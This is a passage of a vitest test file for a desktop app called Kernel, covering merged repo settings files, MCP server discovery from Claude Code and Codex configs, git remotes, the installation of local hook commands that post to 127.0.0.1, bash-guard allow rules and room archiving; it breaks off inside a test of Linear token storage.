import { afterEach, describe, expect, it, vi } from 'vitest'
import { createHash } from 'node:crypto'
import { mkdir, mkdtemp, readFile, realpath, stat, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Kernel } from '../src/main/kernel'
import { installHooks, uninstallHooks, withKernelHooks } from '../src/main/services/hooksInstaller'
import { discoverSkills } from '../src/main/services/files'
import { saveLinearToken, storedLinearToken } from '../src/main/services/integrations'
import { discoverMcp } from '../src/main/services/mcp'
import { aliasesInRoom, disabledInRoom, loadRepoSettings, localSettingsOwn, remoteOf, saveRepoSettings, saveTeamSettings, scriptsToTrust, ScriptTrustStore, trustHash } from '../src/main/services/settings'
import { exec, git, run } from '../src/main/services/exec'
import { bus } from '../src/main/bus'
import type { PushEvent } from '../src/shared/ipc'
import { bashVerdict } from '../src/main/services/bashGuard'
import type { SessionDeps } from '../src/main/services/sessions'
import { fakeGh, tempRepo } from './helpers'

describe('repo settings files', () => {
  it('writes the shared file and the personal one separately, and reads them merged', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    await saveRepoSettings(repo, { scripts: { setup: 'pnpm install', run: 'pnpm dev', runMode: 'single' }, files: { copy: ['.env.local'] } }, true)
    const merged = await saveRepoSettings(repo, { scripts: { setup: 'npm ci' }, workspace: { baseRef: 'origin/dev', deleteBranchOnArchive: true } })
    expect(merged.scripts).toMatchObject({ setup: 'npm ci', run: 'pnpm dev', runMode: 'single' })
    expect(merged.workspace).toEqual({ baseRef: 'origin/dev', deleteBranchOnArchive: true })
    expect(await readFile(join(repo, '.kernel', 'settings.toml'), 'utf8')).toContain('setup = "pnpm install"')
    expect(await readFile(join(repo, '.kernel', 'settings.local.toml'), 'utf8')).toContain('base_ref = "origin/dev"')
  })

  it('a null removes the override and the shared value applies again', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    await saveRepoSettings(repo, { scripts: { setup: 'pnpm install' }, workspace: { mode: 'worktree' } }, true)
    await saveRepoSettings(repo, { scripts: { setup: 'make' }, workspace: { mode: 'current' } })
    const after = await saveRepoSettings(repo, { scripts: { setup: null }, workspace: { mode: null } })
    expect(after.scripts.setup).toBe('pnpm install')
    expect(after.workspace.mode).toBe('worktree')
    // Nothing is left to override, so the personal file is gone (KERNEL-69).
    await expect(readFile(join(repo, '.kernel', 'settings.local.toml'), 'utf8')).rejects.toThrow()
  })

  it('keeps the skills and MCP servers switched off for the room', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    expect((await loadRepoSettings(repo)).disabled).toEqual({ skills: [], mcp: [] })
    const next = await saveRepoSettings(repo, { disabled: { skills: ['plan'], mcp: ['Figma'] } })
    expect(next.disabled).toEqual({ skills: ['plan'], mcp: ['Figma'] })
    await writeFile(join(repo, '.mcp.json'), JSON.stringify({ mcpServers: { Figma: {}, Linear: {} } }))
    expect(await discoverMcp(repo, repo, next.disabled!.mcp)).toEqual([
      { name: 'Figma', source: 'project', enabled: false }, { name: 'Linear', source: 'project', enabled: true }
    ])
  })

  // KERNEL-464: every place Claude Code and Codex read MCP servers from, read only.
  it("finds the user's servers for this repo in ~/.claude.json and Codex's in its config.toml, and writes neither", async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    const home = await mkdtemp(join(tmpdir(), 'kernel-home-'))
    // Claude Code keys a project by its folder with links resolved, which /var is on a Mac.
    const claude = JSON.stringify({
      mcpServers: { github: { command: 'gh-mcp' }, linear: { url: 'https://user' } },
      projects: { [await realpath(repo)]: { mcpServers: { linear: { url: 'https://local' }, sentry: { command: 'sentry-mcp' } } }, '/elsewhere': { mcpServers: { secret: {} } } }
    })
    await writeFile(join(home, '.claude.json'), claude)
    await writeFile(join(repo, '.mcp.json'), JSON.stringify({ mcpServers: { linear: {}, figma: {} } }))
    await mkdir(join(home, '.codex'))
    const codex = ['model = "gpt-6"', '[mcp_servers.linear]', 'command = "linear-mcp"', '[mcp_servers.notion]', 'url = "https://notion"', 'enabled = false', '[profiles.fast]', 'model = "x"', ''].join('\n')
    await writeFile(join(home, '.codex', 'config.toml'), codex)
    // The room's own entry wins over the repo's, which wins over the user's list, as in Claude Code.
    expect(await discoverMcp(repo, home, ['figma', 'notion'])).toEqual([
      { name: 'linear', source: 'local', enabled: true }, { name: 'sentry', source: 'local', enabled: true },
      { name: 'figma', source: 'project', enabled: false }, { name: 'github', source: 'user', enabled: true },
      { name: 'linear', source: 'user', provider: 'codex', enabled: true }, { name: 'notion', source: 'user', provider: 'codex', enabled: false, status: 'disabled' }
    ])
    // An account's own Codex home is read instead.
    const account = await mkdtemp(join(tmpdir(), 'kernel-codex-'))
    await writeFile(join(account, 'config.toml'), '[mcp_servers.jira]\ncommand = "jira-mcp"\n')
    expect((await discoverMcp(repo, home, [], { codexHome: account })).filter((s) => s.provider)).toEqual([{ name: 'jira', source: 'user', provider: 'codex', enabled: true }])
    expect([await readFile(join(home, '.claude.json'), 'utf8'), await readFile(join(home, '.codex', 'config.toml'), 'utf8')]).toEqual([claude, codex])
  })

  it('finds nothing in a config file that is missing or broken (KERNEL-464)', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    const home = await mkdtemp(join(tmpdir(), 'kernel-home-'))
    expect(await discoverMcp(repo, home, [])).toEqual([])
    await writeFile(join(home, '.claude.json'), '{ "mcpServers": ')
    await mkdir(join(home, '.codex'))
    await writeFile(join(home, '.codex', 'config.toml'), '[mcp_servers.linear\n')
    await writeFile(join(repo, '.mcp.json'), JSON.stringify({ mcpServers: ['not', 'a', 'table'] }))
    expect(await discoverMcp(repo, home, [])).toEqual([])
    await writeFile(join(home, '.claude.json'), JSON.stringify({ projects: { [repo]: { mcpServers: { local: {} } } } }))
    expect(await discoverMcp(repo, home, [])).toEqual([{ name: 'local', source: 'local', enabled: true }])
  })

  it('reads the room\'s MCP aliases at once, from both files, alias by alias (KERNEL-464)', async () => {
    const repo = await tempRepo()
    expect(aliasesInRoom(repo)).toEqual({})
    await saveRepoSettings(repo, { mcp: { aliases: { linear: 'claude_ai_Linear', figma: 'Figma' } } }, true)
    await saveRepoSettings(repo, { mcp: { aliases: { linear: 'linear-mine' } } })
    expect(aliasesInRoom(repo)).toEqual({ linear: 'linear-mine', figma: 'Figma' })
    expect(aliasesInRoom(repo)).toEqual((await loadRepoSettings(repo)).mcp?.aliases)
  })

  it('reads what the room switched off at once, from both files, so a toggle reaches the next session (KERNEL-226)', async () => {
    const repo = await tempRepo()
    expect(disabledInRoom(repo)).toEqual({ skills: [], mcp: [] })
    await saveRepoSettings(repo, { disabled: { skills: ['plan'], mcp: ['Figma'] } }, true)
    await saveRepoSettings(repo, { disabled: { mcp: ['Linear'] } })
    // The personal list replaces the shared one, as loadRepoSettings reads it.
    expect(disabledInRoom(repo)).toEqual({ skills: ['plan'], mcp: ['Linear'] })
    expect(disabledInRoom(repo)).toEqual((await loadRepoSettings(repo)).disabled)
    // Switched back on.
    await saveRepoSettings(repo, { disabled: { skills: [] } }, true)
    expect(disabledInRoom(repo).skills).toEqual([])
  })

  it("reads and writes the room's Linear team as a [linear] table", async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    expect((await loadRepoSettings(repo)).linear).toBeUndefined()
    expect((await saveRepoSettings(repo, { linear: { team: 'KERNEL' } }, true)).linear).toEqual({ team: 'KERNEL' })
    expect(await readFile(join(repo, '.kernel', 'settings.toml'), 'utf8')).toContain('[linear]\nteam = "KERNEL"')
    expect((await saveRepoSettings(repo, { linear: { team: 'OPS' } })).linear).toEqual({ team: 'OPS' })
    expect((await saveRepoSettings(repo, { linear: { team: null } })).linear).toEqual({ team: 'KERNEL' })
    expect((await saveRepoSettings(repo, { linear: { team: null } }, true)).linear).toBeUndefined()
  })

  it('reads the personal file, then settings.toml, key by key, and says where each value came from (KERNEL-190)', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    await saveRepoSettings(repo, { scripts: { setup: 'pnpm install', run: 'pnpm dev' }, files: { copy: ['.env'] }, workspace: { remote: 'upstream' } }, true)
    const rs = await saveRepoSettings(repo, { scripts: { setup: 'npm ci' }, files: { copy: ['.env.local'] }, pr: { createInstructions: '# Mine' } })
    expect(rs.scripts).toMatchObject({ setup: 'npm ci', run: 'pnpm dev' })
    expect(rs.files.copy).toEqual(['.env.local'])
    expect(rs.workspace).toEqual({ remote: 'upstream' })
    expect(rs.pr).toEqual({ createInstructions: '# Mine' })
    // An array is one value, so files.copy in both files is an override. Nothing reports scripts.archive: the app default applies.
    // The run script reports under both its names (KERNEL-244).
    expect(rs.sources).toEqual({ 'scripts.setup': 'override', 'scripts.run': 'shared', 'runScripts.run': 'shared', 'files.copy': 'override', 'workspace.remote': 'shared', 'pr.createInstructions': 'local' })
    expect(rs.scripts.archive).toBeUndefined()
    expect(await readFile(join(repo, '.kernel', 'settings.local.toml'), 'utf8')).toContain('[pr]\ncreate_instructions = "# Mine"')
    expect((await loadRepoSettings(await mkdtemp(join(tmpdir(), 'kernel-repo-')))).sources).toEqual({})
  })

  it('a null removes the personal key, the shared value shows through, and an emptied personal file goes (KERNEL-190)', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    await saveRepoSettings(repo, { scripts: { setup: 'pnpm install' } }, true)
    await saveRepoSettings(repo, { scripts: { setup: 'npm ci' }, pr: { fixChecksInstructions: '# Fix' } })
    let rs = await saveRepoSettings(repo, { pr: { fixChecksInstructions: null } })
    expect(rs.pr).toBeUndefined()
    expect(rs.sources).toEqual({ 'scripts.setup': 'override' })
    rs = await saveRepoSettings(repo, { scripts: { setup: null } })
    expect(rs.scripts.setup).toBe('pnpm install')
    expect(rs.sources).toEqual({ 'scripts.setup': 'shared' })
    await expect(stat(join(repo, '.kernel', 'settings.local.toml'))).rejects.toThrow()
  })

  it('reads both files through the same whitelist (KERNEL-190)', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    await mkdir(join(repo, '.kernel'))
    await writeFile(join(repo, '.kernel', 'settings.toml'), '[workspace]\nnope = 1\nbase_ref = "origin/dev"\n[other]\nx = 1\n[pr]\nresolve_instructions = "# Shared"\nmystery = "x"\n')
    await writeFile(join(repo, '.kernel', 'settings.local.toml'), '[pr]\ncreate_instructions = 3\n[scripts]\nwhatever = "x"\n')
    const rs = await loadRepoSettings(repo)
    expect(rs.workspace).toEqual({ baseRef: 'origin/dev' })
    expect(rs.pr).toEqual({ resolveInstructions: '# Shared' })
    expect(rs.sources).toEqual({ 'workspace.baseRef': 'shared', 'pr.resolveInstructions': 'shared' })
  })

  it('reads and writes the tracker, the merge method, MCP aliases and what each agent may use, name by name (KERNEL-432)', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    await saveRepoSettings(repo, { tracker: { kind: 'github' }, pr: { mergeMethod: 'rebase' }, mcp: { aliases: { linear: 'claude_ai_Linear', figma: 'Figma' } }, agents: { unlistedTools: 'hide', allow: { kai: ['linear'], noor: ['figma'] } } }, true)
    const shared = await readFile(join(repo, '.kernel', 'settings.toml'), 'utf8')
    for (const text of ['[tracker]\nkind = "github"', 'merge_method = "rebase"', '[mcp.aliases]\nlinear = "claude_ai_Linear"', '[agents]\nunlisted_tools = "hide"', '[agents.kai]\nallow = [ "linear" ]']) expect(shared).toContain(text)
    // The personal file overrides one alias and one agent's list, and the shared file's other names show through.
    let rs = await saveRepoSettings(repo, { tracker: { kind: 'none' }, mcp: { aliases: { linear: 'linear-mine' } }, agents: { allow: { kai: ['sentry'] } } })
    expect(rs.tracker).toEqual({ kind: 'none' })
    expect(rs.pr).toEqual({ mergeMethod: 'rebase' })
    expect(rs.mcp).toEqual({ aliases: { linear: 'linear-mine', figma: 'Figma' } })
    expect(rs.agents).toEqual({ unlistedTools: 'hide', allow: { kai: ['sentry'], noor: ['figma'] } })
    expect(rs.sources).toEqual({
      'tracker.kind': 'override', 'pr.mergeMethod': 'shared', 'mcp.aliases.linear': 'override', 'mcp.aliases.figma': 'shared',
      'agents.unlistedTools': 'shared', 'agents.allow.kai': 'override', 'agents.allow.noor': 'shared'
    })
    // A null, a blank alias or an empty list removes one name, and a table left empty goes.
    rs = await saveRepoSettings(repo, { mcp: { aliases: { linear: null } }, agents: { allow: { kai: [] } } })
    expect(rs.mcp).toEqual({ aliases: { linear: 'claude_ai_Linear', figma: 'Figma' } })
    expect(rs.agents?.allow).toEqual({ kai: ['linear'], noor: ['figma'] })
    expect((await readFile(join(repo, '.kernel', 'settings.local.toml'), 'utf8')).trim()).toBe('[tracker]\nkind = "none"')
    rs = await saveRepoSettings(repo, { pr: { mergeMethod: null }, mcp: { aliases: { linear: ' ', figma: null } }, agents: { unlistedTools: null, allow: { kai: null, noor: null } } }, true)
    expect([rs.pr, rs.mcp, rs.agents]).toEqual([undefined, undefined, undefined])
    expect((await readFile(join(repo, '.kernel', 'settings.toml'), 'utf8')).trim()).toBe('[tracker]\nkind = "github"')
  })

  it('leaves out a tracker, merge method, alias or allowance it does not know (KERNEL-432)', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    await mkdir(join(repo, '.kernel'))
    await writeFile(join(repo, '.kernel', 'settings.toml'), [
      '[tracker]', 'kind = "trello"', '[pr]', 'merge_method = "fast-forward"', '[mcp.aliases]', 'linear = 3', 'figma = " "', 'sentry = "Sentry"',
      '[agents]', 'unlisted_tools = "maybe"', '[agents.kai]', 'allow = "linear"', '[agents.noor]', 'allow = ["", "figma"]', ''
    ].join('\n'))
    const rs = await loadRepoSettings(repo)
    expect([rs.tracker, rs.pr]).toEqual([undefined, undefined])
    expect(rs.mcp).toEqual({ aliases: { sentry: 'Sentry' } })
    expect(rs.agents).toEqual({ allow: { noor: ['figma'] } })
    expect(rs.sources).toEqual({ 'mcp.aliases.sentry': 'shared', 'agents.allow.noor': 'shared' })
  })

  it("reads and writes the team's roster in [team] (KERNEL-432)", async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    expect((await saveTeamSettings(repo, { roster: ['kai', 'noor'] })).team).toEqual({ roster: ['kai', 'noor'] })
    expect(await readFile(join(repo, '.kernel', 'settings.toml'), 'utf8')).toBe('[team]\nroster = ["kai", "noor"]\n')
    expect((await loadRepoSettings(repo)).sources).toEqual({ 'team.roster': 'shared' })
    expect((await saveTeamSettings(repo, { roster: [] })).team).toBeUndefined()
  })

  it("picks the room's remote, then the app's, then origin (KERNEL-190)", () => {
    expect(remoteOf({ workspace: { remote: 'upstream' } }, { workspace: { remote: 'fork' } as never })).toBe('upstream')
    expect(remoteOf({ workspace: {} }, { workspace: { remote: 'fork' } as never })).toBe('fork')
    expect(remoteOf({ workspace: { remote: ' ' } }, { workspace: { remote: '' } as never })).toBe('origin')
  })
})

describe('a settings file with a typo (KERNEL-231)', () => {
  const broken = '[scripts]\nsetup = "pnpm install"\n[files\ncopy = [".env"]\n'

  it('reads as defaults, and a save refuses rather than rewrite the file', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    await mkdir(join(repo, '.kernel'))
    await writeFile(join(repo, '.kernel', 'settings.toml'), broken)
    expect((await loadRepoSettings(repo)).scripts.setup).toBeUndefined()
    await expect(saveRepoSettings(repo, { scripts: { run: 'pnpm dev' } }, true)).rejects.toThrow(/settings\.toml has a mistake on line 3: .*Kernel didn't save/)
    expect(await readFile(join(repo, '.kernel', 'settings.toml'), 'utf8')).toBe(broken)
    await writeFile(join(repo, '.kernel', 'settings.local.toml'), 'x = \n')
    await expect(saveRepoSettings(repo, { scripts: { run: 'pnpm dev' } })).rejects.toThrow('settings.local.toml has a mistake on line 1')
    expect(await readFile(join(repo, '.kernel', 'settings.local.toml'), 'utf8')).toBe('x = \n')
  })

  it('warns in the room once, with the line, and again only when the mistake changes', async () => {
    const repo = await tempRepo({ '.claude/agents/kai.md': '---\nname: kai\ndescription: Builds.\n---\nHi' })
    const dataDir = await mkdtemp(join(tmpdir(), 'kernel-data-'))
    const home = await mkdtemp(join(tmpdir(), 'kernel-home-'))
    await writeFile(join(dataDir, 'settings.json'), JSON.stringify({ hookPort: 18000 + Math.floor(Math.random() * 900), worktreeRoot: join(home, 'wt') }))
    const k = new Kernel({ dataDir, home, claudeSettingsFile: join(home, 'claude-settings.json') })
    await k.start()
    const room = await k.addRoom(repo)
    const pushes: PushEvent[] = []
    const on = (e: PushEvent) => pushes.push(e)
    bus.on('push', on)
    await mkdir(join(repo, '.kernel'), { recursive: true })
    await writeFile(join(repo, '.kernel', 'settings.toml'), broken)
    await loadRepoSettings(repo)
    await loadRepoSettings(repo)
    const warned = () => pushes.flatMap((e) => (e.type === 'activity' && e.event.roomId === room.id && e.event.warn ? [e.event] : []))
    expect(warned()).toHaveLength(1)
    expect(warned()[0].text).toContain('.kernel/settings.toml has a mistake on line 3')
    expect(pushes.filter((e) => e.type === 'toast')).toHaveLength(1)
    // Fixed, then broken somewhere else: a new warning.
    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "pnpm install"\n')
    expect((await loadRepoSettings(repo)).scripts.setup).toBe('pnpm install')
    await writeFile(join(repo, '.kernel', 'settings.toml'), 'oops\n')
    await loadRepoSettings(repo)
    expect(warned()).toHaveLength(2)
    expect(warned()[1].text).toContain('on line 1')
    bus.off('push', on)
    await k.stop()
  })
})

describe('the room remote (KERNEL-190)', () => {
  const kai = { 'README.md': '# demo\n', '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend.\n---\nKai.' }

  /** A repo whose only remote is `upstream`, a bare repo that has a commit the local main doesn't. */
  async function upstreamRepo() {
    const bare = await mkdtemp(join(tmpdir(), 'kernel-remote-'))
    await run('git', ['init', '-q', '--bare', '-b', 'main', bare])
    const repo = await tempRepo(kai)
    await git(repo, 'remote', 'add', 'upstream', bare)
    await git(repo, 'push', '-q', 'upstream', 'main')
    const other = join(await mkdtemp(join(tmpdir(), 'kernel-clone-')), 'repo')
    await run('git', ['clone', '-q', bare, other])
    await writeFile(join(other, 'later.md'), 'later\n')
    await run('git', ['-C', other, 'add', '-A'])
    await run('git', ['-C', other, '-c', 'user.email=t@t.dev', '-c', 'user.name=Test', 'commit', '-q', '-m', 'later file'])
    await run('git', ['-C', other, 'push', '-q', 'origin', 'main'])
    return { repo, bare }
  }

  /** A kernel on the settings default base (`origin/main`), with `app` merged into its settings. */
  async function kernelOn(repo: string, app: object = {}) {
    const dataDir = await mkdtemp(join(tmpdir(), 'kernel-data-'))
    const home = await mkdtemp(join(tmpdir(), 'kernel-home-'))
    await writeFile(join(dataDir, 'settings.json'), JSON.stringify({ hookPort: 18000 + Math.floor(Math.random() * 900), worktreeRoot: join(home, 'wt'), ...app }))
    const k = new Kernel({ dataDir, home })
    await k.start()
    k.sessions.send = async () => ({ queued: false })
    return { k, h: k.handlers(), room: await k.addRoom(repo) }
  }

  const commit = async (path: string, file: string) => {
    await writeFile(join(path, file), 'x\n')
    await git(path, 'add', '-A')
    await git(path, 'commit', '-q', '-m', file)
  }
  const onBare = async (bare: string, branch: string) => (await exec('git', ['-C', bare, 'rev-parse', '--verify', '--quiet', `refs/heads/${branch}`])).code === 0
  const localBranch = async (repo: string, branch: string) => (await git(repo, 'branch', '--list', branch)).trim() !== ''

  it("is used for the base, the branch list, push and archive's unpushed check", async () => {
    const { repo, bare } = await upstreamRepo()
    const { k, h, room } = await kernelOn(repo)
    await h['settings.setRoom']({ roomId: room.id, patch: { workspace: { remote: 'upstream' } } })

    // The origin/main default means the room's remote, fetched first, so the worktree has the commit local main lacks.
    const a = await k.createWorkspace(room.id, { prompt: 'a', agentId: 'kai', title: 'One' })
    expect(a.baseRef).toBe('upstream/main')
    await expect(stat(join(a.path, 'later.md'))).resolves.toBeTruthy()
    expect(await h['git.branches']({ roomId: room.id })).toEqual(expect.arrayContaining(['main', 'upstream/main']))

    // Push to the room's remote, then archive and delete the branch: nothing is lost, so it goes.
    await commit(a.path, 'a.md')
    await h['workspaces.archive']({ workspaceId: a.id, deleteBranch: true, push: true })
    expect(await onBare(bare, a.branch)).toBe(true)
    expect(await localBranch(repo, a.branch)).toBe(false)

    // Pushed without -u, so the branch still tracks upstream/main: only upstream/<branch> says the commit is safe.
    const b = await k.createWorkspace(room.id, { prompt: 'b', agentId: 'kai', title: 'Two' })
    await commit(b.path, 'b.md')
    await git(b.path, 'push', '-q', 'upstream', b.branch)
    await k.archiveWorkspace(b.id, true)
    expect(await localBranch(repo, b.branch)).toBe(false)
    await k.stop()
  })

  it("uses the app's remote when the room sets none, and origin when neither does", async () => {
    const { repo } = await upstreamRepo()
    const app = await kernelOn(repo, { workspace: { remote: 'upstream' } })
    expect((await app.k.createWorkspace(app.room.id, { prompt: 'a', agentId: 'kai', title: 'One' })).baseRef).toBe('upstream/main')
    await app.k.stop()
    // No remote anywhere: origin, which this repo doesn't have, so the base falls back to local main as before.
    const none = await kernelOn(await tempRepo(kai))
    expect((await none.k.createWorkspace(none.room.id, { prompt: 'b', agentId: 'kai', title: 'Two' })).baseRef).toBe('main')
    await none.k.stop()
  })
})

describe('hooks installer without SessionStart', () => {
  const old = { SessionStart: [{ hooks: [{ type: 'http', url: 'http://localhost:7420/hooks', timeout: 10 }] }, { hooks: [{ type: 'command', command: './mine.sh' }] }] }
  it('does not write a SessionStart entry and removes the one an old install left', () => {
    const next = withKernelHooks({ hooks: old }, 7420, 300, 'ab'.repeat(32))
    expect(next.hooks!.SessionStart).toEqual([{ hooks: [{ type: 'command', command: './mine.sh' }] }])
    expect(JSON.stringify(withKernelHooks({}, 7420, 300, 'ab'.repeat(32)))).not.toContain('SessionStart')
  })

  it('reinstall rewrites the file and uninstall leaves other hooks alone', async () => {
    const file = join(await mkdtemp(join(tmpdir(), 'kernel-hooks-')), 'settings.json')
    await writeFile(file, JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'http', url: 'http://localhost:7420/hooks' }] }] } }))
    await installHooks(file, 7420, 300, 'ab'.repeat(32))
    expect(JSON.parse(await readFile(file, 'utf8')).hooks.SessionStart).toBeUndefined()
    await uninstallHooks(file)
    expect(JSON.parse(await readFile(file, 'utf8'))).toEqual({})
  })
})

describe('bringing out-of-date hooks up to date at start (KERNEL-206)', () => {
  const boot = async (content?: string) => {
    const dataDir = await mkdtemp(join(tmpdir(), 'kernel-data-'))
    const port = 18000 + Math.floor(Math.random() * 800)
    await writeFile(join(dataDir, 'settings.json'), JSON.stringify({ hookPort: port }))
    const claudeSettingsFile = join(await mkdtemp(join(tmpdir(), 'kernel-claude-')), 'settings.json')
    if (content !== undefined) await writeFile(claudeSettingsFile, content)
    const k = new Kernel({ dataDir, home: await mkdtemp(join(tmpdir(), 'kernel-home-')), claudeSettingsFile })
    await k.start()
    return { k, h: k.handlers(), port, claudeSettingsFile }
  }
  const tokenless = (port: number) => `/usr/bin/curl -sf --connect-timeout 1 -m 8 -H 'Content-Type: application/json' --data-binary @- http://127.0.0.1:${port}/hooks || true`
  const mine = { matcher: 'Bash', hooks: [{ type: 'command', command: './guard.sh' }] }

  it('rewrites tokenless Kernel entries with the token and leaves other hooks alone', async () => {
    const before = { hooks: { PreToolUse: [mine, { matcher: '*', hooks: [{ type: 'command', command: tokenless(7420), timeout: 10 }] }] } }
    const { k, h, claudeSettingsFile } = await boot(JSON.stringify(before))
    const status = await h['hooks.status']()
    const after = JSON.parse(await readFile(claudeSettingsFile, 'utf8'))
    expect(after.hooks.PreToolUse[0]).toEqual(mine)
    expect(after.hooks.PreToolUse[1].hooks[0].command).toContain(`X-Kernel-Token: ${status.token}`)
    expect(after.hooks.PreToolUse[1].hooks[0].command).toContain(`127.0.0.1:${status.port}/hooks`)
    expect(Object.keys(after.hooks)).toEqual(['PreToolUse'])
    expect(status.events.find((e) => e.name === 'PreToolUse')?.installed).toBe(true)
    expect(status.needsInstall).toBe(false)
    await k.stop()
  })

  it('writes nothing for a user who never installed', async () => {
    const empty = await boot()
    await expect(stat(empty.claudeSettingsFile)).rejects.toThrow()
    await empty.k.stop()
    const text = JSON.stringify({ hooks: { PreToolUse: [mine] } })
    const other = await boot(text)
    expect(await readFile(other.claudeSettingsFile, 'utf8')).toBe(text)
    await expect(stat(other.claudeSettingsFile + '.kernel-backup')).rejects.toThrow()
    expect((await other.h['hooks.status']()).needsInstall).toBe(false)
    await other.k.stop()
  })

  it('leaves a file it cannot parse alone and asks for Install until a write works', async () => {
    const text = `{ "hooks": { "Stop": [{ "hooks": [{ "type": "command", "command": "${tokenless(7420)}" }] }] }, }`
    const { k, h, port, claudeSettingsFile } = await boot(text)
    expect(await readFile(claudeSettingsFile, 'utf8')).toBe(text)
    await expect(stat(claudeSettingsFile + '.kernel-backup')).rejects.toThrow()
    expect((await h['hooks.status']()).needsInstall).toBe(true)
    // The user fixes the file and clicks Install.
    await writeFile(claudeSettingsFile, '{}')
    await h['hooks.install']({ port })
    expect((await h['hooks.status']()).needsInstall).toBe(false)
    await k.stop()
  })
})

describe('rewriting the hooks on a settings change', () => {
  it('never adds hooks, and moves old http entries to the command form', async () => {
    const dataDir = await mkdtemp(join(tmpdir(), 'kernel-data-'))
    const port = 18000 + Math.floor(Math.random() * 800)
    await writeFile(join(dataDir, 'settings.json'), JSON.stringify({ hookPort: port }))
    const claudeSettingsFile = join(await mkdtemp(join(tmpdir(), 'kernel-claude-')), 'settings.json')
    const k = new Kernel({ dataDir, home: await mkdtemp(join(tmpdir(), 'kernel-home-')), claudeSettingsFile })
    await k.start()
    const h = k.handlers()
    const read = async () => JSON.stringify(JSON.parse(await readFile(claudeSettingsFile, 'utf8')))

    // Nothing installed: a timeout or port change writes nothing.
    await h['settings.set']({ patch: { permissions: { approvalTimeoutSec: 600 } } })
    await h['hooks.restart']({ port: port + 1 })
    await expect(stat(claudeSettingsFile)).rejects.toThrow()

    // Only old http entries: a timeout change rewrites them as commands.
    await writeFile(claudeSettingsFile, JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'http', url: `http://localhost:${port}/hooks`, timeout: 10 }] }] } }))
    expect((await h['hooks.status']()).installed).toBe(false)
    await h['settings.set']({ patch: { permissions: { approvalTimeoutSec: 300 } } })
    expect(await read()).not.toContain('"http"')
    expect(await read()).toContain('-m 320 ')
    expect((await h['hooks.status']()).installed).toBe(true)
    // The hooks carry the token the hook server checks, from the data folder.
    const { token } = await h['hooks.status']()
    expect(token).toMatch(/^[0-9a-f]{64}$/)
    expect(await read()).toContain(`X-Kernel-Token: ${token}`)

    // Current entries: a port change moves them.
    await h['hooks.restart']({ port })
    expect(await read()).toContain(`127.0.0.1:${port}/hooks`)
    expect(await read()).not.toContain(`127.0.0.1:${port + 1}/hooks`)
    await k.stop()
  })
})

describe('removing an Always allow rule', () => {
  it('stops covering the command on the agent\'s next tool call', async () => {
    const repo = await tempRepo({ 'README.md': '# demo\n' })
    const k = new Kernel({ dataDir: await mkdtemp(join(tmpdir(), 'kernel-data-')), home: await mkdtemp(join(tmpdir(), 'kernel-home-')) })
    const room = await k.addRoom(repo)
    const deps = (k.sessions as unknown as { d: SessionDeps }).d
    const lists = { neverAllow: [], alwaysAsk: ['pnpm drizzle-kit push'] }
    deps.allowInRoom(room.id, 'pnpm drizzle-kit push')
    expect(bashVerdict('pnpm drizzle-kit push', lists, deps.roomAllow(room.id))).toBe('allow')

    const h = k.handlers()
    const updated = await h['rooms.update']({ roomId: room.id, patch: { allow: [] } })
    expect(updated.allow).toEqual([])
    // The same callbacks a running session holds read the room fresh, so the next command asks again.
    expect(bashVerdict('pnpm drizzle-kit push', lists, deps.roomAllow(room.id))).toBe('ask')
    await k.stop()
  })
})

async function startKernel(files?: Record<string, string>) {
  const repo = await tempRepo(files)
  const dataDir = await mkdtemp(join(tmpdir(), 'kernel-data-'))
  const home = await mkdtemp(join(tmpdir(), 'kernel-home-'))
  await writeFile(join(dataDir, 'settings.json'), JSON.stringify({ hookPort: 18000 + Math.floor(Math.random() * 900), worktreeRoot: join(home, 'wt'), workspace: { baseRef: 'main' } }))
  const k = new Kernel({ dataDir, home })
  await k.start()
  k.sessions.send = async () => ({ queued: false })
  return { k, repo, dataDir, home, room: await k.addRoom(repo) }
}

describe('archiving a room', () => {
  it('archives every open workspace and keeps the room record', async () => {
    const { k, room } = await startKernel({ 'README.md': '# demo\n', '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend.\n---\nKai.' })
    const a = await k.createWorkspace(room.id, { prompt: 'a', agentId: 'kai', title: 'One' })
    const b = await k.createWorkspace(room.id, { prompt: 'b', agentId: 'kai', title: 'Two' })
    const updated = await k.handlers()['rooms.update']({ roomId: room.id, patch: { archived: true } })
    expect(updated.archived).toBe(true)
    expect(k.store.room(room.id)?.path).toBe(room.path)
    for (const id of [a.id, b.id]) expect(k.store.workspaces(room.id).find((w) => w.id === id)?.status).toBe('archived')
    await k.stop()
  })

  it('keeps the room open and names the workspace when one cannot be archived', async () => {
    const { k, room } = await startKernel({ 'README.md': '# demo\n', '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend.\n---\nKai.' })
    const ws = await k.createWorkspace(room.id, { prompt: 'a', agentId: 'kai', title: 'Stuck' })
    k.archiveWorkspace = async () => { throw new Error('git is locked') }
    await expect(k.handlers()['rooms.update']({ roomId: room.id, patch: { archived: true } })).rejects.toThrow(/stays open.*git is locked/)
    expect(k.store.room(room.id)?.archived).toBeFalsy()
    expect(ws.status).not.toBe('archived')
    await k.stop()
  })
})

describe('Linear token', () => {
  afterEach(() => { vi.unstubAllGlobals(); vi.unstubAllEnvs() })

  it('is saved readable by the user only, and an empty token disconnects', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'kernel-data-'))
